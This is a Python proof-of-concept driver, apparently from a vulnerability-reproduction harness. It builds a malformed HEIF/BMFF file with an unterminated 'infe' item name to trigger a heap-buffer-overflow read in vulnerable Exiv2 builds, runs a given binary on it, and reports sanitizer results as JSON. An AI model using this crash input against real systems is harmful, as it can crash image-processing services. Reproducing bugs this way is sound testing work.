#!/usr/bin/env python3
"""Single-file PoC driver for the given exiv2 build.

The trigger is a tiny BMFF/HEIF-style file containing an ``infe`` box whose
item-name field is not NUL-terminated.  Vulnerable Exiv2 builds pass that
field to ``strlen``, causing a heap-buffer-overflow read.  On a sanitizer or
hardened build this emits a diagnostic / abort; a fixed build reads the field
within its recorded box bounds and does not.
"""

import argparse
import json
import os
import shutil
import signal as signal_module
import struct
import subprocess
import sys
import tempfile
import time

OUTPUT_LIMIT = 20000
DEFAULT_TIMEOUT = 5.0


def _truncate(data):
    if len(data) <= OUTPUT_LIMIT:
        return data
    return data[:OUTPUT_LIMIT] + "...<truncated>"


def build_trigger():
    """Return the malicious BMFF/HEIF input bytes."""
    def box(boxtype, payload):
        return struct.pack(">I", 8 + len(payload)) + boxtype + payload

    ftyp = box(b"ftyp", b"avif" + b"\x00\x00\x00\x00" + b"avif" + b"mif1")

    item_name_len = 64
    infe_payload = (
        b"\x00\x00\x00\x00"      # version(1) + flags(3)
        b"\x00\x01"              # item_ID
        b"\x00\x01"              # item_protection_index
        b"mime"                  # item_type
        b"A" * (item_name_len - 12)
    )
    infe = box(b"infe", infe_payload)
    return ftyp + infe


def signal_name_for(returncode):
    if returncode is None or returncode >= 0:
        return None
    try:
        return signal_module.Signals(-returncode).name
    except (ValueError, OSError):
        return "SIGNAL_%d" % (-returncode)


def sanitizer_marker(text):
    """Return a short, stable sanitizer marker if one is present."""
    markers = (
        "ERROR: AddressSanitizer: heap-buffer-overflow",
        "ERROR: AddressSanitizer: stack-buffer-overflow",
        "ERROR: AddressSanitizer: heap-use-after-free",
        "ERROR: AddressSanitizer: global-buffer-overflow",
        "ERROR: AddressSanitizer:",
        "runtime error:",
        "UndefinedBehaviorSanitizer:",
        "MemorySanitizer:",
    )
    for line in text.splitlines():
        stripped = line.strip()
        for marker in markers:
            if marker in stripped:
                if marker == "ERROR: AddressSanitizer:":
                    # Prefer the more specific first marker if possible.
                    for specific in markers[:4]:
                        if specific in stripped:
                            return specific
                    return marker
                return marker
    return None


def normalize_observable(returncode, timed_out, stdout_text, stderr_text):
    marker = sanitizer_marker(stderr_text) or sanitizer_marker(stdout_text)
    if marker:
        return {"kind": "stderr", "value": marker, "path": None}

    if returncode is not None and returncode < 0:
        name = signal_name_for(returncode)
        return {"kind": "crash_trace", "value": name or str(returncode), "path": None}

    if timed_out:
        return {"kind": "custom", "value": "timeout", "path": None}

    # Keep a benign, checker-visible normal-parse token rather than fabricating
    # a crash.  A fixed build should land here.
    token = stderr_text.strip() or stdout_text.strip()
    if token:
        first_line = token.splitlines()[0][:200]
        return {"kind": "stderr", "value": first_line, "path": None}
    return {"kind": "custom", "value": "no memory-corruption evidence", "path": None}


def run_target(binary_arg, input_path, timeout):
    command = [binary_arg, input_path]
    environment = os.environ.copy()
    # Make sanitizer failures deterministic and concise when the supplied
    # build is memory-instrumented.  These variables have no effect on
    # non-instrumented builds and do not inject any code.
    environment.setdefault(
        "ASAN_OPTIONS",
        "detect_leaks=0:abort_on_error=1:halt_on_error=1:print_summary=0",
    )
    environment.setdefault("UBSAN_OPTIONS", "halt_on_error=1:print_stacktrace=1")

    started = time.monotonic()
    timed_out = False
    process = subprocess.Popen(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        env=environment,
    )
    try:
        stdout_bytes, stderr_bytes = process.communicate(timeout=timeout)
    except subprocess.TimeoutExpired:
        timed_out = True
        process.kill()
        stdout_bytes, stderr_bytes = process.communicate()

    elapsed_ms = int((time.monotonic() - started) * 1000)
    returncode = process.returncode

    stdout_text = _truncate(stdout_bytes.decode("utf-8", "replace"))
    stderr_text = _truncate(stderr_bytes.decode("utf-8", "replace"))
    return {
        "binary": binary_arg,
        "command": command,
        "returncode": -9 if (timed_out and returncode is None) else returncode,
        "signal": "SIGKILL" if (timed_out and returncode is None) else signal_name_for(returncode),
        "timed_out": timed_out,
        "runtime_ms": elapsed_ms,
        "stdout": stdout_text,
        "stderr": stderr_text,
        "observable": normalize_observable(returncode, timed_out, stdout_text, stderr_text),
        "error": None,
    }


def error_result(binary_arg, message):
    return {
        "binary": binary_arg,
        "command": [],
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "custom", "value": message, "path": None},
        "error": message,
    }


def parse_args(argv=None):
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--binary", required=True, help="target executable to test")
    parser.add_argument("--json-out", default=None, help="optional JSON result path")
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT,
                        help="per-run timeout in seconds (default: %(default)s)")
    return parser.parse_args(argv)


def main(argv=None):
    args = parse_args(argv)

    binary_arg = args.binary
    if not (os.path.isfile(binary_arg) or shutil.which(binary_arg)):
        result = error_result(binary_arg, "binary not found or not executable")
    else:
        try:
            timeout = float(args.timeout)
            if timeout <= 0:
                raise ValueError("timeout must be positive")
        except ValueError as exc:
            result = error_result(binary_arg, str(exc))
            timeout = None

        if timeout is not None:
            with tempfile.TemporaryDirectory(prefix="exiv2-poc-") as temp_dir:
                input_path = os.path.join(temp_dir, "trigger.mp4")
                with open(input_path, "wb") as handle:
                    handle.write(build_trigger())
                result = run_target(binary_arg, input_path, timeout)

    serialized = json.dumps(result, sort_keys=False, separators=(",", ":"))
    print(serialized)

    if args.json_out:
        json_path = args.json_out
        try:
            os.makedirs(os.path.dirname(os.path.abspath(json_path)), exist_ok=True)
            with open(json_path, "w", encoding="utf-8") as handle:
                handle.write(serialized + "\n")
        except OSError as exc:
            # The stdout object is authoritative; still surface the write
            # failure in the returned object if possible.
            result["error"] = "failed to write --json-out: %s" % (exc,)
            print(json.dumps(result, sort_keys=False, separators=(",", ":")))

    return 0


if __name__ == "__main__":
    sys.exit(main())
